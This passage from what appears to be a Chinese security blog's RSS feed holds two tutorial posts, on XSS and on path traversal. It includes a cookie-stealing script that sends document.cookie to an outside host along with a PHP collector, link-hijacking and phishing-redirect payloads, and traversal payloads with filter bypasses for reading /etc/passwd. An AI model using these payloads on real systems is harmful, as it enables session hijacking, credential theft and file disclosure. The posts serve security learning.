src="/images/2023/12/20/Pasted-image-20231123135020.png"></a></p><p>如果用户输入如下恶意 js 代码： <code>&quot;&gt; &lt;script&gt;alert(/xss/)&lt;/script&gt; &quot;&lt;</code>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231128215413.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231128215413.png"></a></p><p>用户输入的数据被嵌入当作 html 标签嵌入页面中，恶意代码被执行，触发 xss。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/20/Pasted-image-20231123135946.png" data-caption=""><img src="/images/2023/12/20/Pasted-image-20231123135946.png"></a></p><h1 id="4-XSS-危害"><a href="#4-XSS-危害" class="headerlink" title="4 XSS 危害"></a>4 XSS 危害</h1><h2 id="4-1-盗取-cookie，劫持会话"><a href="#4-1-盗取-cookie，劫持会话" class="headerlink" title="4.1 盗取 cookie，劫持会话"></a>4.1 盗取 cookie，劫持会话</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?uname=&lt;script&gt;document.location=&quot;http://ip/cookie.php?cookie=&quot; + document.cookie&lt;/script&gt; #</span><br></pre></td></tr></table></figure><p>exploit server 的 cookie.php 代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;cookie.txt&#x27;</span>, <span class="variable">$cookie</span>);</span><br></pre></td></tr></table></figure><h2 id="4-2-篡改网页链接"><a href="#4-2-篡改网页链接" class="headerlink" title="4.2 篡改网页链接"></a>4.2 篡改网页链接</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> link = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; link.<span class="property">length</span>; j++)&#123;</span></span><br><span class="line"><span class="language-javascript">            link[j].<span class="property">href</span> = <span class="string">&quot;http://attacker-site.com/&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="4-3-盗取用户信息"><a href="#4-3-盗取用户信息" class="headerlink" title="4.3 盗取用户信息"></a>4.3 盗取用户信息</h2><p>思路：<strong>克隆网站登录页面</strong>，利用存储XSS设置跳转代码，如果用户访问，即跳转到克隆网站的登录页面，用户输入登录，账号密码被存储。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;克隆网站ip&quot;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>如何克隆网站？<br><strong>答：</strong> kali setookit！</p></blockquote><h1 id="5-XSS-测试与发现"><a href="#5-XSS-测试与发现" class="headerlink" title="5 XSS 测试与发现"></a>5 XSS 测试与发现</h1><h2 id="5-1-自动化工具"><a href="#5-1-自动化工具" class="headerlink" title="5.1 自动化工具"></a>5.1 自动化工具</h2><ol><li>Burp Suite scanner</li><li><a href="https://github.com/s0md3v/XSStrike">XSStrike</a></li></ol><h2 id="5-2-手动探测"><a href="#5-2-手动探测" class="headerlink" title="5.2 手动探测"></a>5.2 手动探测</h2><ol><li>构造一个独一无二且不会被识别为恶意代码的字符串用来提交到页面</li><li>使用浏览器审查工具进行代码审查，寻找构造的字符串是否在页面中显示，如何显示，构造的字符串在相应标签中的位置（属性还是标签内容）。</li></ol><p>主要是明确数据流以及网站处理数据的方式。</p><h1 id="6-XSS-防御"><a href="#6-XSS-防御" class="headerlink" title="6 XSS 防御"></a>6 XSS 防御</h1><p>不好意思，现在不太 care 防御手段（傲娇</p>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/owaspTop10/">owaspTop10</category>
      
      <category domain="https://by-musi.github.io/tags/xss/">xss</category>
      
      
      <comments>https://by-musi.github.io/2023/12/20/XSS%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>路径穿越基础介绍</title>
      <link>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</link>
      <guid>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/</guid>
      <pubDate>Sat, 16 Dec 2023 16:00:00 GMT</pubDate>
      
        
        
          
          
      <description></description>
          
        
      
      
      
      <content:encoded><![CDATA[<blockquote><p>你的 web 服务器不过是我的文件管理器罢了 :-\</p></blockquote><h1 id="1-什么是路径穿越"><a href="#1-什么是路径穿越" class="headerlink" title="1 什么是路径穿越"></a>1 什么是路径穿越</h1><p>路径穿越，path-traversal，也称为路径遍历、目录穿越&#x2F;遍历（directory traversal），是一种能让攻击者通过使用一些类似 <code>../</code> 的<strong>目录控制序列</strong>访问 web 服务器上<strong>任意文件</strong>的安全漏洞。</p><p>任意文件主要包括：</p><ul><li>程序源码和数据</li><li>服务端证书</li><li>敏感的系统文件，<code>/etc/passwd</code></li></ul><p>path-traversal 被 OWASP 收录的 Broken Access Control（BAC，越权访问）一栏，BAC 可是 <a href="https://owasp.org/www-project-top-ten/">OWASP Top 10</a> 2021 版中的 No.1 哦。</p><h1 id="2-测试方法"><a href="#2-测试方法" class="headerlink" title="2 测试方法"></a>2 测试方法</h1><p>寻找路径穿越漏洞分两步：</p><ol><li>输入向量枚举，定位注入点。</li><li>测试，绕过</li></ol><h2 id="2-1-不同OS的敏感文件位置"><a href="#2-1-不同OS的敏感文件位置" class="headerlink" title="2.1 不同OS的敏感文件位置"></a>2.1 不同OS的敏感文件位置</h2><p>需要了解 <strong>web app 服务端的架构、操作系统及其文件管理方式</strong>，就算存在路径穿越但你不知道你想要的文件放哪就尴尬了。</p><ul><li>Unix-like OS:<ul><li>root directory: <code>/</code></li><li>directory separator: <code>/</code></li><li>网站根目录：<code>/var/www/</code>, <code>/var/www/images/</code></li><li>常用 payload: <code>../../../etc/passwd</code></li></ul></li><li>Windows OS:<ul><li>root directory: <code>&lt;drive letter&gt;:</code></li><li>directory separator: <code>\</code> or <code>/</code></li></ul></li></ul><h2 id="2-2-举个栗子"><a href="#2-2-举个栗子" class="headerlink" title="2.2 举个栗子"></a>2.2 举个栗子</h2><p>以 PortSwigger Labs 中的一个简单<a href="https://portswigger.net/web-security/file-path-traversal/lab-simple">例子</a>进行说明：</p><p>开启 burp 再打开一个页面。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110748.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110748.png"></a></p><p>观察 HTTP history，找到一个 GET 图片文件的请求，这里可能存在路径穿越。（一堆 google 自动发的包，裂开</p><p>这里能直接看到一个访问请求，我就不枚举用户输入向量了，一般情况要要测试用户所有可能的输入向量，包括 GET 和 POST 等请求。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209110859.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209110859.png"></a></p><p>网页源码里面也能看到。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209111405.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209111405.png"></a></p><p>发送到 Repeater 重放，测试。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231206224112.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231206224112.png"></a></p><p>得到的响应报文如下，可以看到已经拿到了 <code>/etc/passwd</code> 的内容了。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231207222507.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231207222507.png"></a></p><h1 id="3-常规防御与绕过"><a href="#3-常规防御与绕过" class="headerlink" title="3 常规防御与绕过"></a>3 常规防御与绕过</h1><h2 id="3-1-使用绝对路径"><a href="#3-1-使用绝对路径" class="headerlink" title="3.1 使用绝对路径"></a>3.1 使用绝对路径</h2><p>删掉所有目录遍历序列，如 <code>../</code> 等 <a href="https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-2-双写绕过"><a href="#3-2-双写绕过" class="headerlink" title="3.2 双写绕过"></a>3.2 双写绕过</h2><p>仅将 <code>../</code> 替换为空，未对替换处理后的 filename 进行二次检查(non-recursively) <a href="https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively">no case, no learning</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=....//..././..././etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-3-编码绕过"><a href="#3-3-编码绕过" class="headerlink" title="3.3 编码绕过"></a>3.3 编码绕过</h2><p>先放一个好用的编码工具：<a href="https://gchq.github.io/CyberChef/">CyberChef</a>。</p><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209113640.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209113640.png"></a></p><h3 id="3-3-1-URL-编码-与-double-URL-编码"><a href="#3-3-1-URL-编码-与-double-URL-编码" class="headerlink" title="3.3.1 URL 编码 与 double URL 编码"></a>3.3.1 URL 编码 与 double URL 编码</h3><p><code>../</code> 和 <code>..\</code> 各个部分url 编码的排列组合，我简单列几个。</p><ul><li>%2E%2E%2F –&gt; ..&#x2F;</li><li>%2E%2E&#x2F; –&gt; ..&#x2F;</li><li>..%2F –&gt; ..&#x2F;</li><li>%252E%252E%252F</li><li>..%5C –&gt; ..\</li><li>%2E%2E%5C –&gt; ..\</li><li>%252E%252E%255C –&gt; ..\</li></ul><h3 id="3-3-2-unicode-编码"><a href="#3-3-2-unicode-编码" class="headerlink" title="3.3.2 unicode 编码"></a>3.3.2 unicode 编码</h3><p><a data-fancybox="gallery" data-src="/images/2023/12/17/Pasted-image-20231209122622.png" data-caption=""><img src="/images/2023/12/17/Pasted-image-20231209122622.png"></a></p><ul><li>\u002E\u002E\u002F –&gt; ..&#x2F;</li><li>\u002E\u002E\u005C –&gt; ..\</li></ul><h3 id="3-3-3-其他非标准编码"><a href="#3-3-3-其他非标准编码" class="headerlink" title="3.3.3 其他非标准编码"></a>3.3.3 其他非标准编码</h3><ul><li>..%c0%af</li><li>..%ef%bc%8f</li></ul><h2 id="3-4-其他绕过方式"><a href="#3-4-其他绕过方式" class="headerlink" title="3.4 其他绕过方式"></a>3.4 其他绕过方式</h2><h3 id="3-4-1-00-截断"><a href="#3-4-1-00-截断" class="headerlink" title="3.4.1 %00 截断"></a>3.4.1 %00 截断</h3><p>某些情况下 web app 会验证文件的扩展名，如必须以 <code>.png</code> 结尾等。如果简单构造 <code>filename=../../../etc/passwd.png</code> 显然无法拿到我们想要的文件。</p><p>而截断机制既能绕过输入有效性验证，又能在解析文件时拿到我们想要的文件。 <a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass">no case, no learning</a></p><p>%00 截断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=../../../etc/passwd%00.jpg</span><br></pre></td></tr></table></figure><p>#todo</p><ul><li><input disabled="" type="checkbox"> 调研其他截断机制？</li></ul><h3 id="3-4-2-必须包含某些路径"><a href="#3-4-2-必须包含某些路径" class="headerlink" title="3.4.2 必须包含某些路径"></a>3.4.2 必须包含某些路径</h3><p>有些 web app 要求文件名中必须包含某些特定的目录 (base folder)，这时我们仍可以使用 <code>../</code> 拿到我们想要的内容。<a href="https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path">no case, no learning</a> </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/var/www/images/../../../etc/passwd</span><br></pre></td></tr></table></figure><p>#todo </p><ul><li><input disabled="" type="checkbox"> 汇总常见 Payload</li></ul><h1 id="4-防御手段"><a href="#4-防御手段" class="headerlink" title="4 防御手段"></a>4 防御手段</h1><p>最有效的防御方法就是<strong>缩小攻击面</strong>，典型的例子：中国防火墙 Great Firewall。对于路径穿越的防御也同样适用，避免用户与 filesystem APIs 交互能有效减少路径穿越攻击的风险。</p><p>但大部分情况下无法避免用户提供的输入与 filesystem APIs 交互，防御方法如下：</p><ol><li>使用<strong>白名单</strong>对<strong>用户输入</strong>进行验证与过滤</li><li>使用当前操作系统路径规范化函数规范化路径后，进行过滤，最后再进行相关调用</li></ol><h1 id="5-工具"><a href="#5-工具" class="headerlink" title="5 工具"></a>5 工具</h1><p>说实话感觉这玩意手动测试的话也太麻烦了。</p><p>一些常用的工具:</p><ul><li>BurpSuite Intruder 可用这些 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal/Intruder">字典</a> 对其进行配置</li><li><a href="https://github.com/wireghoul/dotdotpwn">DotDotPwn</a> 好久不更新了呀</li><li><a href="https://www.zaproxy.org/">OWASP ZAP</a></li><li><a href="https://github.com/xmendez/wfuzz">wfuzz</a></li></ul><p>常回来看看：</p><ul><li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings">PayloadsAllTheThings</a></li></ul><h1 id="6-参考链接"><a href="#6-参考链接" class="headerlink" title="6 参考链接"></a>6 参考链接</h1><ul><li><a href="https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md">OWASP wstg path-traversal</a></li><li><a href="https://portswigger.net/web-security/file-path-traversal">path-traversal by PortSwigger</a></li><li><a href="https://websec.readthedocs.io/zh/latest/vuln/pathtraversal.html">目录穿越</a></li><li><a href="https://code.google.com/archive/p/teenage-mutant-ninja-turtles/wikis/AdvancedObfuscationPathtraversal.wiki">Advanced Directory Traversal filter bypassing</a></li><li><a href="https://blog.csdn.net/qingzhantianxia/article/details/128204437">路径穿越（Path Traversal）详解</a></li></ul>]]></content:encoded>
      
      
      
      <category domain="https://by-musi.github.io/tags/web/">web</category>
      
      <category domain="https://by-musi.github.io/tags/owaspTop10/">owaspTop10</category>
      
      <category domain="https://by-musi.github.io/tags/path-traversal/">path-traversal</category>
      
      
      <comments>https://by-musi.github.io/2023/12/17/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%9F%BA%E7%A1%80%E4%BB%8B%E7%BB%8D/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
